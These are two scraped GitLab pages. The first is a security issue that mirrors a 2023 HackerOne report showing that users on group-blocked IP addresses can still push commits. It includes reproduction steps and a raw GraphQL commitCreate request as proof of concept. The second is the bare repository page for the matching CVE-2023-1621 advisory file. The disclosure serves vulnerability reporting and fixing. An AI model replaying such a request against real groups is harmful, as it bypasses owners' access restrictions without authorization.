=== Content from gitlab.com_cd15b121_20250115_102348.html ===


[Skip to content](#content-body)
GitLab
[Next](https://next.gitlab.com)

* Menu

  + [Why GitLab](https://about.gitlab.com/why-gitlab)
  + [Pricing](https://about.gitlab.com/pricing)
  + [Contact Sales](https://about.gitlab.com/sales)
  + [Explore](/explore)
* [Why GitLab](https://about.gitlab.com/why-gitlab)
* [Pricing](https://about.gitlab.com/pricing)
* [Contact Sales](https://about.gitlab.com/sales)
* [Explore](/explore)

* [Sign in](/users/sign_in?redirect_to_referer=yes)
* [Get free trial](/users/sign_up)

# Users on banned IP addresses can still commit to projects

âš  **Please read [the process](https://gitlab.com/gitlab-org/release/docs/-/blob/master/general/security/developer.md) on how to fix security issues before starting to work on the issue. Vulnerabilities must be fixed in a security mirror.**

**[HackerOne report #1914049](https://hackerone.com/reports/1914049)** by `js_noob` on 2023-03-21, assigned to `GitLab Team`:

[Report](#report) | [Attachments](#attachments) | [How To Reproduce](#how-to-reproduce)

## Report

##### Summary

Hello team, as a part of the grp/project security an owner can block certain IP addresses from accessing that group resources (projects,...). However, even if a user is on a blocked IP address he can still commit to projects.

##### Steps to reproduce

1. Create a grp, project and add a maintainer
2. From the owner navigate to <https://gitlab.com/groups/YOUR_GRP/-/edit#js-permissions-settings> and add the maintainer IP address under `Restrict access by IP address`
3. From the maintainer navigate to <https://gitlab.com/GRP/PROJECT/-/tree/main> and verify the 404
4. From the maintainer send the following request, but change the variables according to your preferences

```
POST /api/graphql HTTP/2
Host: gitlab.com
Cookie: YOUR_COOKIES
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/111.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: https://gitlab.com/-/graphql-explorer?_gl=1*1mb1g5a*_ga*MjM3Mzk5MDUzLjE2NzczMjcxMTY.*_ga_ENFH3X7M5Y*MTY3ODk4Mzg2Ni40LjEuMTY3ODk4MzkwNi4wLjAuMA..
Content-Type: application/json
X-Csrf-Token: xD3r11jgwirOfA6E1GB1pL9ZEuq8lqQCYcrZo4eSO8xbfvb9kmkI5BmsLqWWtgLw894u3hwjqXeGO4LbPJ_cNg
Content-Length: 489
Origin: https://gitlab.com
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Te: trailers

{"query":"mutation MyMutation {\n  commitCreate(\n    input: {\n      projectPath: \"test645811/project-1\",\n      branch: \"main\",\n      message: \"This is a Commit\",\n      actions: [\n        {\n          action: UPDATE,\n          filePath: \"README.md\",\n          content: \"This is a test content\",\n          encoding: TEXT\n        }\n      ]\n    }\n  ) {\n    commit {\n      author {\n        name\n      }\n    }\n  }\n}\n","variables":null,"operationName":"MyMutation"}
```

5. Verify the successful response and from the owner verify the creation of the commit

##### Video/POC

[bandicam\_2023-03-21\_20-40-59-702.mp4](https://user-content.gitlab-static.net/50eeed1cde60804f44a9ce93c599795d680d0385/68747470733a2f2f68312e7365632e6769746c61622e6e65742f612f36656231653064632d316436622d346539632d623765302d3233386562343061386636312f62616e646963616d5f323032332d30332d32315f32302d34302d35392d3730322e6d7034 "Download 'bandicam_2023-03-21_20-40-59-702.mp4'")

#### Impact

Users from banned IP addresses can manage push changes to project where they should be completely blocked from accessing any project that belongs to that group.

## Attachments

**Warning:** Attachments received through HackerOne, please exercise caution!

* [bandicam\_2023-03-21\_20-40-59-702.mp4](https://h1.sec.gitlab.net/a/6eb1e0dc-1d6b-4e9c-b7e0-238eb40a8f61/bandicam_2023-03-21_20-40-59-702.mp4)

## How To Reproduce

Please add [reproducibility information](https://about.gitlab.com/handbook/engineering/security/#reproducibility-on-security-issues) to this section:

Assignee
Loading

Time tracking
Loading

Confidentiality

Confidentiality controls have moved to the issue actions menu () at the top of the page.



=== Content from gitlab.com_6575bb09_20250115_102347.html ===


[Skip to content](#content-body)
GitLab
[Next](https://next.gitlab.com)

* Menu

  + [Why GitLab](https://about.gitlab.com/why-gitlab)
  + [Pricing](https://about.gitlab.com/pricing)
  + [Contact Sales](https://about.gitlab.com/sales)
  + [Explore](/explore)
* [Why GitLab](https://about.gitlab.com/why-gitlab)
* [Pricing](https://about.gitlab.com/pricing)
* [Contact Sales](https://about.gitlab.com/sales)
* [Explore](/explore)

* [Sign in](/users/sign_in?redirect_to_referer=yes)
* [Get free trial](/users/sign_up)

* [cves](/gitlab-org/cves/-/tree/master)
* [2023](/gitlab-org/cves/-/tree/master/2023)
* [**CVE-2023-1621.json**](/gitlab-org/cves/-/blob/master/2023/CVE-2023-1621.json)

Find file

[Blame](/gitlab-org/cves/-/blame/master/2023/CVE-2023-1621.json)
[Permalink](/gitlab-org/cves/-/blob/5dbfc725a86e6d942deec9c36b7f06f5b8d912fc/2023/CVE-2023-1621.json "Go to permalink <kbd class='flat ml-1' aria-hidden=true>y</kbd>")

* [![ðŸ¤– GitLab Bot ðŸ¤–'s avatar](/uploads/-/system/user/avatar/1786152/avatar.png?width=64 "ðŸ¤– GitLab Bot ðŸ¤–")](/gitlab-bot)

  Jun 02, 2023

  [7a5141fd](/gitlab-org/cves/-/commit/7a5141fd462340fd48248c5148e1d1e13c09cb37)
  [Publishing 1 updated advisories and 1 new advisories](/gitlab-org/cves/-/commit/7a5141fd462340fd48248c5148e1d1e13c09cb37)
  Â·
  7a5141fd

  [ðŸ¤– GitLab Bot ðŸ¤–](/gitlab-bot) authored Jun 02, 2023

  7a5141fd

  [Publishing 1 updated advisories and 1 new advisories](/gitlab-org/cves/-/commit/7a5141fd462340fd48248c5148e1d1e13c09cb37)
  [ðŸ¤– GitLab Bot ðŸ¤–](/gitlab-bot) authored Jun 02, 2023

Loading


